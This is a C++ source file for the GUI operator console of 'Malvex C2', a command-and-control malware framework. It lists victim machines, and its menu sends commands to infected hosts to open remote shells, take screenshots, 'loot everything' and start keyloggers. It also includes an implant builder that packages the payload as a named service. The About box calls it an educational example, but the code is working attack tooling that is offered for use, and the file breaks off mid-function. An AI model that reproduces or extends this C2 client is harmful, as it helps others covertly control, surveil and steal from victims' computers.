#include "UI.hpp"
#include "Builder.hpp"
#include "Client.hpp"
#include "LogManager.hpp"
#include "FileBrowser.hpp"
#include "SessionDAO.hpp"
#include "SessionManager.hpp"
#include "UiLayout.hpp"
#include <Types.hpp>

#include <raylib.h>
#include <string>
#include <thread>
#include <vector>

#if defined(__clang__)
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wnarrowing"
#elif defined(__GNUC__)
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wnarrowing"
#endif

#define RAYGUI_STYLE_DARK
#include <styles/dark/style_dark.h>

#if defined(__clang__)
#pragma clang diagnostic pop
#elif defined(__GNUC__)
#pragma GCC diagnostic pop
#endif

namespace {

void apply_malvex_theme() {
    GuiLoadStyleDark();

    const int text_padding = 10;
    const int border_width = 1;

    const int controls[] = {
        DEFAULT, LABEL, BUTTON, TOGGLE, SLIDER, PROGRESSBAR, CHECKBOX,
        COMBOBOX, DROPDOWNBOX, TEXTBOX, VALUEBOX, LISTVIEW, COLORPICKER,
        SCROLLBAR, STATUSBAR,
    };

    for (const int control : controls) {
        GuiSetStyle(control, TEXT_PADDING, text_padding);
        GuiSetStyle(control, BORDER_WIDTH, border_width);
    }

    GuiSetStyle(DEFAULT, TEXT_SIZE, 16);
    GuiSetStyle(DEFAULT, TEXT_LINE_SPACING, 4);
    GuiSetStyle(DEFAULT, BACKGROUND_COLOR, ColorToInt({28, 28, 34, 255}));
    GuiSetStyle(DEFAULT, BASE_COLOR_NORMAL, ColorToInt({42, 42, 52, 255}));
    GuiSetStyle(DEFAULT, BASE_COLOR_FOCUSED, ColorToInt({56, 56, 70, 255}));
    GuiSetStyle(DEFAULT, BASE_COLOR_PRESSED, ColorToInt({72, 72, 88, 255}));
    GuiSetStyle(DEFAULT, BORDER_COLOR_NORMAL, ColorToInt({90, 90, 110, 255}));
    GuiSetStyle(DEFAULT, BORDER_COLOR_FOCUSED, ColorToInt({180, 60, 90, 255}));
    GuiSetStyle(DEFAULT, LINE_COLOR, ColorToInt({70, 70, 86, 255}));
    GuiSetStyle(DEFAULT, TEXT_COLOR_NORMAL, ColorToInt({230, 230, 240, 255}));
    GuiSetStyle(DEFAULT, TEXT_COLOR_FOCUSED, ColorToInt({255, 255, 255, 255}));

    GuiSetStyle(BUTTON, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
    GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_LEFT);
    GuiSetStyle(TEXTBOX, TEXT_ALIGNMENT, TEXT_ALIGN_LEFT);
    GuiSetStyle(STATUSBAR, TEXT_ALIGNMENT, TEXT_ALIGN_LEFT);
}

void draw_panel_title(Rectangle bounds, const char* title) {
    if (title != nullptr && title[0] != '\0') {
        GuiLabel({bounds.x + ui::kPadding, bounds.y + 8.0f, bounds.width - ui::kPadding * 2.0f, 22.0f}, title);
    }
}

void draw_malvex_panel(Rectangle bounds, const char* title, Color fill, Color border) {
    ui::draw_panel_frame(bounds, fill, border);
    draw_panel_title(bounds, title);
}

void draw_malvex_section_header(Rectangle content, const char* title) {
    GuiLabel({content.x, content.y + 4.0f, content.width, 24.0f}, title);
    ui::draw_section_divider(content);
}

} // namespace

// function prototypes
void drawConnectionsTab(WindowState& res);
void drawSettingsTab(WindowState& state);
void drawLogsTab(WindowState& state);
void drawBuilderTab(WindowState& state);
void drawSessionsTab(WindowState& state);
void drawAbout(WindowState& state);
void drawLogin(WindowState& state);

//-------------------------------------------------
//
//-------------------------------------------------
int main() {
    WindowState state{
        .show_about=false,
        .is_fullscreen=false,
        .res={ 1200, 800},
        .font={},
        .current_tab=Tab::CONNECTIONS,
        .is_connected=false,
        .user_settings={},
        .implant_settings={},
        .client=Client::instance(),
        .builder=Builder::instance(),
        .wait_for_response=false,
        .login_failed=false
    };

    // load malvex config:
    strncpy(state.user_settings.username.text, state.client.getUsername().c_str(), sizeof(state.user_settings.username.text));
    strncpy(state.user_settings.password.text, state.client.getPassword().c_str(), sizeof(state.user_settings.password.text));
    strncpy(state.user_settings.server_url.text, state.client.getServerUrl().c_str(), sizeof(state.user_settings.server_url.text));
    strncpy(state.user_settings.default_timeout.text, state.client.getTimeout().c_str(), sizeof(state.user_settings.default_timeout.text));
    strncpy(state.user_settings.output_file_path.text, state.client.getOutputPath().c_str(), sizeof(state.user_settings.output_file_path.text));

    // load builder settings:
    strncpy(state.implant_settings.username.text, state.builder.getUsername().c_str(), sizeof(state.implant_settings.username.text));
    strncpy(state.implant_settings.password.text, state.builder.getPassword().c_str(), sizeof(state.implant_settings.password.text));
    strncpy(state.implant_settings.server_url.text, state.builder.getServerURL().c_str(), sizeof(state.implant_settings.server_url.text));
    strncpy(state.implant_settings.default_timeout.text, state.builder.getTimeout().c_str(), sizeof(state.implant_settings.default_timeout.text));
    strncpy(state.implant_settings.output_file_path.text, state.builder.getOutputDir().c_str(), sizeof(state.implant_settings.output_file_path.text));
    strncpy(state.implant_settings.service_name.text, state.builder.getServiceName().c_str(), sizeof(state.implant_settings.service_name.text));
    strncpy(state.implant_settings.service_description.text, state.builder.getServiceDesc().c_str(), sizeof(state.implant_settings.service_description.text));


    ui::Resolution old_res = state.res;
    auto& client = Client::instance();

    const std::string title_bar_label = GuiIconText(ICON_DEMON, "Malvex C2 - GUI Client");

    // Set up the window
    SetConfigFlags(FLAG_WINDOW_RESIZABLE);
    InitWindow(state.res.width, state.res.height, "Malvex C2 - GUI Client");
    SetTargetFPS(30);
    apply_malvex_theme();
    const auto bg_color = GetColor(GuiGetStyle(DEFAULT, BACKGROUND_COLOR));
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    // Set custom font (must be after theme load, before drawing)
    state.font = LoadFont("Resources/Font.ttf");
    if (state.font.texture.id == 0) {
        TraceLog(LOG_WARNING, "Failed to load Resources/Font.ttf, using default font");
        state.font = GetFontDefault();
    } else {
        SetTextureFilter(state.font.texture, TEXTURE_FILTER_BILINEAR);
    }
    GuiSetFont(state.font);

    // Check if we already have a bearer token
    if (client.hasServerSession()) {
        state.is_connected = true;
    }

    // Render Loop
    while (not WindowShouldClose()) {
        BeginDrawing();
        ClearBackground(bg_color);

        state.res = {
            static_cast<float>(GetScreenWidth()),
            static_cast<float>(GetScreenHeight())
        };

        // --- Menu Bar ---
        const auto title_bounds = ui::title_bar(state.res);
        DrawRectangleRec(title_bounds, {32, 32, 40, 255});

        if (GuiButton({ui::kPadding, 8, 90, 22}, GuiIconText(ICON_INFO, "About"))) {
            state.show_about = true;
        }

        const int title_align = GuiGetStyle(LABEL, TEXT_ALIGNMENT);
        GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
        GuiLabel({0.0f, 8.0f, state.res.width, 22.0f}, title_bar_label.c_str());
        GuiSetStyle(LABEL, TEXT_ALIGNMENT, title_align);

        if (GuiButton({state.res.width - ui::kPadding - 24, 8, 24, 22}, "X")) {
            break;
        }

        if (GuiButton({state.res.width - ui::kPadding - 130, 8, 120, 22}, GuiIconText(ICON_CURSOR_SCALE_FILL, "Fullscreen"))) {
            state.is_fullscreen = not state.is_fullscreen;

            if (state.is_fullscreen) {
                int m = GetCurrentMonitor();
                old_res = state.res;
                ui::Resolution new_res{
                    static_cast<float>(GetMonitorWidth(m)),
                    static_cast<float>(GetMonitorHeight(m))
                };

                ToggleFullscreen();
                SetWindowSize(new_res.width, new_res.height);
            } else {
                ToggleFullscreen();
                SetWindowSize(old_res.width, old_res.height);
            }
        }

        // Draw popup if active
        if (not state.is_connected) {
            drawLogin(state);
        } else if (state.show_about) {
            drawAbout(state);
        } else {
            // --- Tab Bar ---
            const auto tab_bar = ui::tab_bar(state.res);
            ui::draw_rounded_rect(tab_bar, panel_fill, panel_border);

            const float tab_gap = 6.0f;
            const float tab_width = (tab_bar.width - tab_gap * (tabs.size() + 1)) / static_cast<float>(tabs.size());

            for (size_t i = 0; i < tabs.size(); i++) {
                Rectangle tab_button{
                    tab_bar.x + tab_gap + static_cast<float>(i) * (tab_width + tab_gap),
                    tab_bar.y + 6.0f,
                    tab_width,
                    tab_bar.height - 12.0f,
                };

                int original_base = GuiGetStyle(BUTTON, BASE_COLOR_NORMAL);
                int original_text = GuiGetStyle(BUTTON, TEXT_COLOR_NORMAL);

                if (state.current_tab == static_cast<Tab>(i)) {
                    GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, ColorToInt({150, 30, 70, 255}));
                    GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, ColorToInt({255, 230, 120, 255}));
                }

                if (GuiButton(tab_button, tabs.at(i).c_str())) {
                    state.current_tab = static_cast<Tab>(i);
                }

                GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, original_base);
                GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, original_text);
            }

            // --- Active Tab ---
            switch(state.current_tab) {
                case Tab::CONNECTIONS:
                    drawConnectionsTab(state);
                    break;
                case Tab::LOGS:
                    drawLogsTab(state);
                    break;
                case Tab::SETTINGS:
                    drawSettingsTab(state);
                    break;
                case Tab::BUILDER:
                    drawBuilderTab(state);
                    break;
                case Tab::TERMINAL:
                    drawSessionsTab(state);
                    break;
            }
        }

        // Send off the Log Buffer:
        if (not state.client.sendLogBuffer()) {
            LogManager::instance().local_log("Failed to send Attack logs to the Server!");
        }

        // --- Status Bar ---
        const auto status_bounds = ui::status_bar(state.res);
        ui::draw_rounded_rect(status_bounds, panel_fill, panel_border);
        GuiStatusBar(ui::inset(status_bounds, 4.0f), client.getStatusText());

        EndDrawing();
    }

    CloseWindow();
    return 0;
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawConnectionsTab(WindowState& state) {
    static Vector2 scroll = {0, 0};
    static Rectangle view = {0, 0, 0, 0};
    static Rectangle content = {0, 0, 0, 30 * 25};
    static Vector2 menuPos = {};
    static bool menuVisible = false;
    static int selectedRow = -1;
    static int hoveredRow = -1;
    static LogManager& logMan = LogManager::instance();
    static auto port = gen_port();

    const auto& res{ state.res };
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "List of Victim Connections");
    auto body = ui::section_content(page);

    if (GuiButton(ui::toolbar_button(body.x, body.y, 150), GuiIconText(ICON_REPEAT_FILL, "Refresh List"))) {
        if (Client::instance().fetchVictims()) {
            logMan.local_log("Fetched Victims from Server");
        } else {
            logMan.local_log("Refreshing the Victim List failed!");
        }
    }

    Rectangle table_panel{
        body.x,
        body.y + ui::kControlHeight + ui::kGap,
        body.width,
        std::max(0.0f, body.height - ui::kControlHeight - ui::kGap),
    };
    ui::draw_panel_frame(table_panel, panel_fill, panel_border);

    const auto table_body = ui::panel_body(table_panel, false);

    const char* headers[] = {
        "ID", "Hostname", "LAN", "WAN", "OS",
        "Username", "Status"
    };
    constexpr int colCount = 7;

    const float col_width = table_body.width / colCount;
    constexpr float row_height = 28.0f;

    for (int i = 0; i < colCount; i++) {
        Rectangle header_cell{
            table_body.x + i * col_width,
            table_body.y,
            col_width,
            row_height,
        };
        ui::draw_rounded_rect(header_cell, {52, 52, 64, 255}, {70, 70, 86, 255});
        GuiLabel(ui::inset(header_cell, 6.0f), headers[i]);
    }

    Rectangle panelRect{
        table_body.x,
        table_body.y + row_height + 4.0f,
        table_body.width,
        std::max(0.0f, table_body.height - row_height - 4.0f),
    };

    Vector2 mouse = GetMousePosition();

    if (not menuVisible && CheckCollisionPointRec(mouse, panelRect)) {
        float localY = mouse.y - panelRect.y - scroll.y;
        if (localY >= 0 && localY < content.height) {
            hoveredRow = static_cast<int>(localY / row_height);
            if (hoveredRow >= 50) {
                hoveredRow = -1;
            }
        }
    }

    GuiScrollPanel(panelRect, nullptr, content, &scroll, &view);

    BeginScissorMode(
        static_cast<int>(panelRect.x),
        static_cast<int>(panelRect.y),
        static_cast<int>(panelRect.width),
        static_cast<int>(panelRect.height));

    auto& client = Client::instance();
    const auto& victims = client.getVictims();

    for (size_t client_id{0}; client_id < victims.size(); ++client_id) {
        auto line_color = client_id % 2 == 0 ? Color{58, 58, 72, 255} : Color{46, 46, 58, 255};

        if (static_cast<int>(client_id) == hoveredRow) {
            line_color = {150, 30, 70, 255};
        }

        const auto& vic{ victims[client_id] };
        const std::string values[colCount]{
            std::to_string(vic.id),
            vic.hostname,
            vic.internal_ip,
            vic.external_ip,
            vic.operating_system,
            vic.username,
            vic.status == 1 ? "ONLINE" : "OFFLINE"
        };

        for (int i = 0; i < colCount; ++i) {
            Rectangle cell{
                table_body.x + i * col_width,
                table_body.y + row_height + 4.0f + scroll.y + row_height * static_cast<float>(client_id),
                col_width,
                row_height,
            };
            ui::draw_rounded_rect(cell, line_color, {40, 40, 50, 255}, 0.0f);
            GuiLabel(ui::inset(cell, 6.0f), values[i].c_str());
        }
    }

    if (IsMouseButtonPressed(MOUSE_RIGHT_BUTTON) && hoveredRow >= 0) {
        menuVisible = true;
        menuPos = mouse;
        selectedRow = hoveredRow;
    }

    if (menuVisible && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
        Rectangle menuArea{menuPos.x, menuPos.y, 320, 500};
        if (not CheckCollisionPointRec(mouse, menuArea)) {
            menuVisible = false;
        }
    }

    EndScissorMode();

    if (menuVisible && selectedRow >= 0) {
        const auto btn_height = ui::kControlHeight + 4.0f;
        Rectangle menuRect{menuPos.x, menuPos.y, 320, btn_height * 9 + ui::kPadding * 2};
        draw_malvex_panel(
            menuRect,
            GuiIconText(ICON_DEMON, TextFormat("Attack Victim #%d", selectedRow)),
            panel_fill,
            panel_border);

        const float menu_x = menuRect.x + ui::kPadding;
        const float menu_y = menuRect.y + 40.0f;
        const float menu_w = menuRect.width - ui::kPadding * 2.0f;

        Rectangle btn1{menu_x, menu_y + btn_height * 0, menu_w, ui::kControlHeight};
        Rectangle btn2{menu_x, menu_y + btn_height * 1, menu_w, ui::kControlHeight};
        Rectangle btn3{menu_x, menu_y + btn_height * 2, menu_w, ui::kControlHeight};
        Rectangle btn4{menu_x, menu_y + btn_height * 3, menu_w, ui::kControlHeight};
        Rectangle btn5{menu_x, menu_y + btn_height * 4, menu_w, ui::kControlHeight};
        Rectangle btn6{menu_x, menu_y + btn_height * 5, menu_w, ui::kControlHeight};
        Rectangle btn7{menu_x, menu_y + btn_height * 6, menu_w, ui::kControlHeight};
        Rectangle btn8{menu_x, menu_y + btn_height * 7, menu_w, ui::kControlHeight};

        const auto timeout = std::atol(state.user_settings.default_timeout.text);
        const auto victim = victims[selectedRow];

        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, static_cast<int>(timeout)))) {
            if (state.client.sendTimeoutCommand(victim.uid, timeout)) {
                logMan.attack_log(std::format("Timeout Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Timeout Command failed!");
            }
            menuVisible = false;
        }

        if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", port))) {
            if (state.client.sendOpenSessionCommand(victim.uid, port)) {
                logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));

                if (state.client.openSession(port)) {
                    SessionManager::instance().startSession(
                        state.client.getServerHost(),
                        port,
                        state.client.getUsername(),
                        state.client.getPassword());
                }
            } else {
                logMan.local_log("Sending Open Session Command failed!");
            }
            menuVisible = false;
            port = gen_port();
            state.current_tab = Tab::TERMINAL;
        }
        if (GuiButton(btn3, "Close open Shells")) {
            if (state.client.sendCloseSessionCommand(victim.uid)) {
                logMan.attack_log(std::format("Closing Open Sessions for Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Timeout Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn4, "Take Screenshot")) {
            if (state.client.sendScreenshotCommand((victim.uid))) {
                logMan.attack_log(std::format("Screenshot Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Screenshot Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn5, "Loot Everything!")) {
            if (state.client.sendLootCommand(victim.uid)) {
                logMan.attack_log(std::format("Loot Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Loot Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn6, "Start Keylogger")) {
            if (state.client.sendStartKeyloggerCommand(victim.uid)) {
                logMan.attack_log(std::format("Starting Keylogger on Client: {}", victim.uid));
            } else {
                logMan.local_log("Starting Keylogger failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn7, "Stop Keylogger")) {
            if (state.client.sendStopKeyloggerCommand(victim.uid)) {
                logMan.attack_log(std::format("Stopping Keylogger on Client: {}", victim.uid));
            } else {
                logMan.local_log("Stopping Keylogger failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn8, "Uninstall Implant")) {
            if (state.client.sendUninstallCommand(victim.uid)) {
                logMan.attack_log(std::format("Uninstalling Implant on Client: {}", victim.uid));
            } else {
                logMan.local_log("Uninstalling failed!");
            }
            menuVisible = false;
        }
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawLogin(WindowState& state) {
    static const Texture2D texture = LoadTexture("Resources/Logo.png");
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    Rectangle popupRect = ui::centered_popup(state.res, 640, 320);
    draw_malvex_panel(popupRect, GuiIconText(ICON_DEMON, "Connect to MalvexC2 Server"), panel_fill, panel_border);

    const float imageX = popupRect.x + ui::kPadding;
    const float imageY = popupRect.y + 48.0f;
    const float imageWidth = 180.0f;
    const float imageHeight = 180.0f;

    DrawTexturePro(
        texture,
        Rectangle{0, 0, static_cast<float>(texture.width), static_cast<float>(texture.height)},
        Rectangle{imageX, imageY, imageWidth, imageHeight},
        Vector2{0, 0},
        0.0f,
        WHITE);

    const float form_x = popupRect.x + 220.0f;
    const float form_w = popupRect.width - 236.0f;

    if (state.wait_for_response) {
        GuiTextBox(
            Rectangle{form_x, popupRect.y + popupRect.height - 72.0f, form_w, ui::kControlHeight},
            const_cast<char*>("Connecting! Please Stand by ..."),
            0,
            false);
        return;
    }

    ui::FormLayout form{{form_x, popupRect.y + 52.0f, form_w, 170.0f}, 90.0f};

    GuiLabel(form.label_rect(), "Username:");
    if (GuiTextBox(form.field_rect(), state.user_settings.username.text, MAX_INPUT_CHARS, state.user_settings.username.edit)) {
        state.user_settings.username.edit = not state.user_settings.username.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Password:");
    if (GuiTextBox(form.field_rect(), state.user_settings.password.text, MAX_INPUT_CHARS, state.user_settings.password.edit)) {
        state.user_settings.password.edit = not state.user_settings.password.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Server:");
    if (GuiTextBox(form.field_rect(), state.user_settings.server_url.text, MAX_INPUT_CHARS, state.user_settings.server_url.edit)) {
        state.user_settings.server_url.edit = not state.user_settings.server_url.edit;
    }

    if (GuiButton(Rectangle{form_x, popupRect.y + popupRect.height - 72.0f, form_w, ui::kControlHeight}, "Login")) {
        state.client.setUsername(state.user_settings.username.text);
        state.client.setPassword(state.user_settings.password.text);
        state.client.setServerUrl(state.user_settings.server_url.text);

        state.login_failed = false;
        state.wait_for_response = true;

        std::thread([&state]{
            state.is_connected = state.client.login();
            if(not state.is_connected) {
                state.login_failed = true;
            }
            state.wait_for_response = false;
        }).detach();
    }

    if (state.login_failed) {
        GuiLabel(Rectangle{form_x, popupRect.y + popupRect.height - 36.0f, form_w, 24.0f}, "Login Failed!");
    } else if (GuiButton(Rectangle{form_x, popupRect.y + popupRect.height - 36.0f, form_w, ui::kControlHeight}, "Start Local Server")) {
        state.client.setServerUrl("https://127.0.0.1:1337");
        state.client.setUsername(state.user_settings.username.text);
        state.client.setPassword(state.user_settings.password.text);

        std::system("./server --local");

        state.is_connected = true;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawAbout(WindowState& state) {
    static const Texture2D texture = LoadTexture("Resources/Logo.png");
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    Rectangle popupRect = ui::centered_popup(state.res, 640, 320);
    draw_malvex_panel(popupRect, GuiIconText(ICON_DEMON, "About MalvexC2"), panel_fill, panel_border);

    const float imageX = popupRect.x + ui::kPadding;
    const float imageY = popupRect.y + 48.0f;
    const float imageWidth = 180.0f;
    const float imageHeight = 180.0f;

    DrawTexturePro(
        texture,
        Rectangle{0, 0, static_cast<float>(texture.width), static_cast<float>(texture.height)},
        Rectangle{imageX, imageY, imageWidth, imageHeight},
        Vector2{0, 0},
        0.0f,
        WHITE);

    // Draw text below image
    const char* popupText =
        "MalvexC2 was written by Erarnitox\n\n\n\n"
        "For Educational Purposes only!\n\n\n\n"
        "This should never be used for anything\n\n\n\n"
        "It is only an example Project!\n\n\n\n\n\n\n\n"
        "SUBSCRIBE TO ERARNITOX ON YOUTUBE!";

    GuiLabel({ popupRect.x + 270, popupRect.y + 300, 300, 30 }, popupText);

    // Close button
    if (GuiButton(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Close")) {
        state.show_about = false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawLogsTab(WindowState& state) {
    static const size_t MAX_LOG_SIZE{4096};
    static char logText[MAX_LOG_SIZE] = "Log started...\n";
    static Vector2 scrollOffset = {0, 0};
    static Rectangle logBounds = {0, 0, 0, 0};
    static LogManager& logMan = LogManager::instance();
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    const auto& res = state.res;
    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "C2 Event Log");
    auto body = ui::section_content(page);

    if (GuiButton(ui::toolbar_button(body.x, body.y, 150), GuiIconText(ICON_REPEAT_FILL, "Refresh Logs"))) {
        if(not state.client.fetchLogs()) {
            logMan.local_log("Fetching of remote Logs failed!");
        }

        for(const auto& log : logMan.refresh()) {
            char newEntry[128];
            snprintf(newEntry, sizeof(newEntry), "%s\n", log.c_str());

            if (strlen(logText) + strlen(newEntry) < MAX_LOG_SIZE - 1) {
                strcat(logText, newEntry);
            }
        }
    }

    Rectangle log_panel{
        body.x,
        body.y + ui::kControlHeight + ui::kGap,
        body.width,
        std::max(0.0f, body.height - ui::kControlHeight - ui::kGap),
    };
    ui::draw_panel_frame(log_panel, panel_fill, panel_border);
    const auto log_body = ui::panel_body(log_panel, false);

    GuiScrollPanel(
        log_body,
        NULL,
        Rectangle{0, 0, log_body.width - 20.0f, 2000.0f},
        &scrollOffset,
        &logBounds);

    BeginScissorMode(
        static_cast<int>(log_body.x),
        static_cast<int>(log_body.y),
        static_cast<int>(log_body.width),
        static_cast<int>(log_body.height));

    DrawTextEx(
        state.font,
        logText,
        Vector2{log_body.x + ui::kPadding, log_body.y + ui::kPadding + scrollOffset.y},
        16.0f,
        1.0f,
        RAYWHITE);

    EndScissorMode();
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawSettingsTab(WindowState& state) {
    static FileBrowser fb{FileBrowser::Mode::SELECT_DIRECTORY};
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    auto& settings = state.user_settings;
    const auto& res = state.res;

    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "Malvex Settings");

    Rectangle form_panel = ui::section_content(page);
    ui::draw_panel_frame(form_panel, panel_fill, panel_border);

    ui::FormLayout form{ui::panel_body(form_panel, false)};

    GuiLabel(form.label_rect(), "Username:");
    if (GuiTextBox(form.field_rect(), settings.username.text, MAX_INPUT_CHARS, settings.username.edit)) {
        settings.username.edit = !settings.username.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Password:");
    if (GuiTextBox(form.field_rect(), settings.password.text, MAX_INPUT_CHARS, settings.password.edit)) {
        settings.password.edit = !settings.password.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Timeout:");
    if (GuiTextBox(form.field_rect(), settings.default_timeout.text, MAX_INPUT_CHARS, settings.default_timeout.edit)) {
        settings.default_timeout.edit = !settings.default_timeout.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Server:");
    if (GuiTextBox(form.field_rect(), settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
        settings.server_url.edit = !settings.server_url.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Output Dir:");
    if (GuiTextBox(form.field_rect(0.72f), settings.output_file_path.text, MAX_INPUT_CHARS, settings.output_file_path.edit)) {
        settings.output_file_path.edit = !settings.output_file_path.edit;
    }
    if (GuiButton({form.field_rect().x + form.field_rect(0.72f).width + ui::kGap, form.field_rect().y, form.field_rect().width * 0.28f - ui::kGap, form.row_height}, "Browse...")) {
        fb.open();
    }
    form.next_row();

    if (GuiButton({form.field_x, form.cursor_y, 220.0f, ui::kControlHeight}, "Save Settings")) {
        state.client.setUsername(settings.username.text);
        state.client.setPassword(settings.password.text);
        state.client.setServerUrl(settings.server_url.text);
    }

    fb.render();

    if (not fb.is_open() && not fb.get_selected_path().empty()) {
        strcpy(settings.output_file_path.text, fb.get_selected_path().c_str());
        fb.clear();
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawBuilderTab(WindowState& state) {
    static FileBrowser fb{FileBrowser::Mode::SELECT_DIRECTORY};
    static bool server_url_was_editing = false;
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    auto& settings = state.implant_settings;
    const auto& res = state.res;

    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "Implant Builder");

    Rectangle form_panel = ui::section_content(page);
    ui::draw_panel_frame(form_panel, panel_fill, panel_border);

    ui::FormLayout form{ui::panel_body(form_panel, false)};

    GuiLabel(form.label_rect(), "Username:");
    if (GuiTextBox(form.field_rect(), settings.username.text, MAX_INPUT_CHARS, settings.username.edit)) {
        settings.username.edit = !settings.username.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Password:");
    if (GuiTextBox(form.field_rect(), settings.password.text, MAX_INPUT_CHARS, settings.password.edit)) {
        settings.password.edit = !settings.password.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Timeout:");
    if (GuiTextBox(form.field_rect(), settings.default_timeout.text, MAX_INPUT_CHARS, settings.default_timeout.edit)) {
        settings.default_timeout.edit = !settings.default_timeout.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Server:");
    if (GuiTextBox(form.field_rect(), settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
        settings.server_url.edit = !settings.server_url.edit;
    }
    if (server_url_was_editing && !settings.server_url.edit) {
        state.builder.setServerURL(settings.server_url.text);
        const auto saved_url = state.builder.getServerURL();
        strncpy(settings.server_url.text, saved_url.c_str(), sizeof(settings.server_url.text) - 1);
        settings.server_url.text[sizeof(settings.server_url.text) - 1] = '\0';
    }
    server_url_was_editing = settings.server_url.edit;
    form.next_row();

    GuiLabel(form.label_rect(), "Output Dir:");
    if (GuiTextBox(form.field_rect(0.72f), settings.output_file_path.text, MAX_INPUT_CHARS, settings.output_file_path.edit)) {
        settings.output_file_path.edit = !settings.output_file_path.edit;
    }
    if (GuiButton({form.field_rect().x + form.field_rect(0.72f).width + ui::kGap, form.field_rect().y, form.field_rect().width * 0.28f - ui::kGap, form.row_height}, "Browse...")) {
        fb.open();
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Service:");
    if (GuiTextBox(form.field_rect(), settings.service_name.text, MAX_INPUT_CHARS, settings.service_name.edit)) {
        settings.service_name.edit = !settings.service_name.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Description:");
    if (GuiTextBox(form.field_rect(), settings.service_description.text, MAX_INPUT_CHARS, settings.service_description.edit)) {
        settings.service_description.edit = !settings.service_description.edit;
    }
    form.next_row();

    if (GuiButton({form.field_x + 230.0f, form.cursor_y, 250.0f, ui::kControlHeight}, "Register Victim User")) {
        auto& logs = LogManager::instance();
        state.builder.setServerURL(settings.server_url.text);
        const auto saved_url = state.builder.getServerURL();
        strncpy(settings.server_url.text, saved_url.c_str(), sizeof(settings.server_url.text) - 1);
        settings.server_url.text[sizeof(settings.server_url.text) - 1] = '\0';

        logs.attack_log(std::format("Registering Victim Template: {}", settings.username.text));

        if (state.client.registerTemplate(settings.username.text, settings.password.text)) {
            logs.attack_log("SUCCESS: Registred Victim Template!");
        }
    }

    if (GuiButton({form.field_x, form.cursor_y, 220.0f, ui::kControlHeight}, "Build Implant")) {
        state.builder.setUsername(settings.username.text);
        if (!state.builder.getPassword().starts_with("$pbkdf2-sha256$")) {
            state.builder.setPassword(settings.password.text);
        }
        state.builder.setServerURL(settings.server_url.text);
        state.builder.setTimeout(settings.default_timeout.text);
        state.builder.setServiceName(settings.service_name.text);
        state.builder.setServiceDesc(settings.service_description.text);
        state.builder.setOutputDir(settings.output_file_path.text);

        state.builder.buildImplant();
    }

    fb.render();

    if (not fb.is_open() && not fb.get_selected_path().empty()) {
        strcpy(settings.output_file_path.text, fb.get_selected_path().c_str());
        fb.clear();
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawSessionsTab(WindowState& state) {
    static int selected_session = -1;
    static bool commandEditMode = false;
    static char terminalOutput[4096] = "Terminal started. Type 'mlvx_help' for commands.\n\n";
    static char commandInput[1024] = {0};
    static float scrollOffset = 0;
    static SessionBridgeState last_reported_state = SessionBridgeState::Closed;
    static size_t last_session_count = 0;
    static SessionManager& sessionMan = SessionManager::instance();
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    const auto& res = state.res;
    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "Remote Shell Sessions");

    const std::vector<SessionDAO>& sessions = sessionMan.getSessions();

    if (sessions.size() > last_session_count) {
        selected_session = static_cast<int>(sessions.size()) - 1;
        last_reported_state = SessionBridgeState::Closed;
